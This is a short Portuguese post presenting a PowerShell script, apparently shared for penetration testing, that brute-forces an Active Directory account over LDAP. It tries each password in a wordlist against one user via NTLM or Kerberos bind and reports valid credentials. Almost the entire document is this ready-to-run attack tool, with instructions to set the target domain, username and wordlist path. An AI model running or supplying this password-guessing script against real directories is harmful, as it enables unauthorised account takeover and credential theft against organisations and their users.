Script modificado para funcionar com maior automatização, salve o script como .ps1 e altere o endereço do domínio, do usuário e também do local aonde está salvo o seu wordlist:

$auth = "ntlm" #Escolher entre ntlm ou kerberos
if ($auth.ToLower() -NotIn @("ntlm","kerberos")) {
  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
  exit 1
}

$domain = "cliente.com.br" #Altera para o dominio necessario
$user = "eduardo.teste" #Altera para o nome do usuário

[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($domain,389)

$passwordList = Get-Content -Path C:\Trabalho\OneDrive\hack\Teste\passwords.txt #altera para o caminho do seu wordlist.txt
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential($user, $password, $domain)
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::$auth)
  try {
    Write-Host " [-] Attempting ${password} on account ${user}."
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] ${user}:${password} are valid credentials!"
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host "End of bruteforce"